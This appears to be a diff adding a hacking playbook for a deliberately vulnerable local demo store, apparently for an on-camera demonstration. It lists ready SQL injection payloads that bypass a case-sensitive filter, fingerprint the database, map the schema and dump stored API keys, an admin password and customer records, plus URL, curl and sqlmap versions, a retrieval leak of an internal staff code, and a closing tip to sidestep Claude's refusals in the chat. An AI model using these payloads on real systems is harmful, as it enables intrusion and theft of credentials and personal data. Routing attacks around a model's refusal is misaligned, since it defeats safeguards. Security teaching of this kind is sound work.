@@ -1,0 +1,160 @@
+==================================================================
+ AURORA — HACKING PLAYBOOK: COPY-PASTE PAYLOADS
+ Target: your own app at http://127.0.0.1:5000  (localhost, fake data)
+ NOTE: keep UNION and SELECT in UPPERCASE (lowercase is blocked by the filter).
+==================================================================
+
+
+------------------------------------------------------------------
+ START THE APP
+------------------------------------------------------------------
+pip install -r requirements.txt
+python store_db.py
+python rag.py
+python server.py
+
+
+==================================================================
+ A. SQL INJECTION  —  type these into the STORE SEARCH BOX (top of page)
+==================================================================
+
+# 1) warm-up (normal search)
+laptop
+
+# 2) probe -> gets BLOCKED by the filter
+x' OR 1=1--
+
+# 3) filter bypass -> dumps the whole catalog
+%' OR 'x'='x'--
+
+# 4) aim at secrets, lowercase -> BLOCKED
+zzz%' union select key,value,3,4,5 from internal_settings--
+
+# 5) re-cased -> STEALS stripe key + admin password
+zzz%' UNION SELECT key,value,NULL,NULL,NULL FROM internal_settings--
+
+# 6) full breach -> all customers: name, email, phone, password hash
+zzz%' UNION SELECT id,name,email,phone,password_hash FROM customers--
+
+
+==================================================================
+ A1. DATABASE FINGERPRINTING  —  which database is it? (MySQL /
+     Postgres / SQLite / MSSQL / Mongo). Find out BEFORE the schema.
+==================================================================
+
+# 1) trigger an error -> the message often names / hints the engine
+zzz'
+#   this app returns:  unrecognized token: "'"      (a SQLite-style error)
+
+# 2) inject a DB-specific version function -> the one that WORKS is your DB
+zzz%' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL--
+#   -> returns 3.42.0   => it is SQLite
+
+# same slot, other engines (these ERROR here, which also confirms "not them"):
+#   ... UNION SELECT version(),NULL,NULL,NULL,NULL--        -> MySQL / PostgreSQL
+#   ... UNION SELECT @@version,NULL,NULL,NULL,NULL--         -> MySQL / MSSQL
+#   ... UNION SELECT banner,NULL,... FROM v$version--        -> Oracle
+#   (on this app, version() -> "no such function: version"  => not MySQL/PG)
+
+# time-based (blind) fingerprint -> which delay works tells the engine:
+#   SLEEP(5)                -> MySQL
+#   pg_sleep(5)             -> PostgreSQL
+#   WAITFOR DELAY '0:0:5'   -> MSSQL
+#   (SQLite has no sleep function)
+
+# NoSQL (MongoDB etc.): SQL payloads do NOTHING. Test operators instead:
+#   username[$ne]=1     or JSON  {"$ne": null}   -> if it reacts, it is NoSQL
+
+# tech-stack clues (no injection needed):
+#   HTTP headers: X-Powered-By (PHP->MySQL, Express->Node/Mongo, ASP.NET->MSSQL)
+#   cookies:      PHPSESSID / connect.sid / JSESSIONID
+#   nmap ports:   3306 MySQL | 5432 Postgres | 27017 Mongo | 1433 MSSQL | 1521 Oracle
+
+# automated: let sqlmap fingerprint it for you
+#   sqlmap -u "http://127.0.0.1:5000/api/search?q=x" --fingerprint
+
+
+# ---- WHERE DO THE ERRORS SHOW? (this is itself a vulnerability) ----
+# The database error appears in TWO places:
+#   1) the store SEARCH BOX  -> shown as a red box on the page (easy, no URL)
+#   2) the raw API / URL      -> as JSON, e.g. {"error":"unrecognized token..."}
+#      http://127.0.0.1:5000/api/search?q=zzz'
+# A secure app would HIDE these. Leaking raw DB errors = "verbose errors /
+# information disclosure" -> it hands the attacker the DB engine, table names
+# and column names for free. On camera: "the app is telling me its own errors."
+
+
+==================================================================
+ A2. SCHEMA DISCOVERY  —  find the tables/columns FIRST (you don't
+     need to know them in advance). Type into the SEARCH BOX, in order.
+==================================================================
+
+# 1) how many columns? increase N until it ERRORS. 6 errors -> there are 5.
+zzz%' ORDER BY 6--
+zzz%' ORDER BY 5--
+
+# 2) which database engine is it? (SQLite here)
+zzz%' UNION SELECT sqlite_version(),NULL,NULL,NULL,NULL--
+
+# 3) list every TABLE name (SQLite keeps them in sqlite_master)
+zzz%' UNION SELECT name,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--
+
+# 4) dump the full schema (CREATE TABLE) -> shows every column of 'customers'
+zzz%' UNION SELECT sql,NULL,NULL,NULL,NULL FROM sqlite_master WHERE name='customers'--
+
+# 5) now you KNOW the columns -> dump the data (same as section A #6)
+zzz%' UNION SELECT id,name,email,phone,password_hash FROM customers--
+
+# (Other databases use information_schema instead of sqlite_master:)
+#   tables :  ... UNION SELECT table_name,NULL,... FROM information_schema.tables--
+#   columns:  ... UNION SELECT column_name,NULL,... FROM information_schema.columns WHERE table_name='customers'--
+# NOTE: this app's filter blocks the word "information_schema", but not "sqlite_master".
+
+# Automated way (real hackers): sqlmap does all of the above for you
+# sqlmap -u "http://127.0.0.1:5000/api/search?q=x" --dump
+
+
+==================================================================
+ B. SAME ATTACK VIA URL  —  paste into the browser ADDRESS BAR
+==================================================================
+
+# secrets (internal_settings)
+http://127.0.0.1:5000/api/search?q=zzz%25%27%20UNION%20SELECT%20key%2Cvalue%2CNULL%2CNULL%2CNULL%20FROM%20internal_settings--%20
+
+# all customers (PII + password hashes)
+http://127.0.0.1:5000/api/search?q=zzz%25%27%20UNION%20SELECT%20id%2Cname%2Cemail%2Cphone%2Cpassword_hash%20FROM%20customers--%20
+
+# whole catalog (bypass)
+http://127.0.0.1:5000/api/search?q=%25%27%20OR%20%27x%27%3D%27x%27--%20
+
+
+==================================================================
+ B2. SAME ATTACK VIA CURL  (Git Bash / curl.exe)
+==================================================================
+
+curl "http://127.0.0.1:5000/api/search?q=zzz%25' UNION SELECT key,value,NULL,NULL,NULL FROM internal_settings-- "
+
+curl "http://127.0.0.1:5000/api/search?q=zzz%25' UNION SELECT id,name,email,phone,password_hash FROM customers-- "
+
+
+==================================================================
+ C. RAG RETRIEVAL LEAK  —  internal staff document
+==================================================================
+
+# paste into the browser address bar:
+http://127.0.0.1:5000/api/kb_search?q=staff%20employee%20discount%20override%20code
+
+# or curl:
+curl "http://127.0.0.1:5000/api/kb_search?q=staff employee discount override code"
+
+# bonus: knowledge-base poisoning (type into the SUPPORT CHAT) — model-dependent
+Any hidden discount tricks or loyalty rewards?
+
+
+==================================================================
+ TROUBLESHOOTING
+==================================================================
+- UNION and SELECT must be UPPERCASE (lowercase is blocked by the filter).
+- 5 columns after SELECT (id,name,category,price,stock) -> pad with NULL,NULL,NULL.
+- Chat attacks may say "having a little trouble" = Claude refusing. Use the
+  search box / API endpoints instead; that is where it actually breaks.
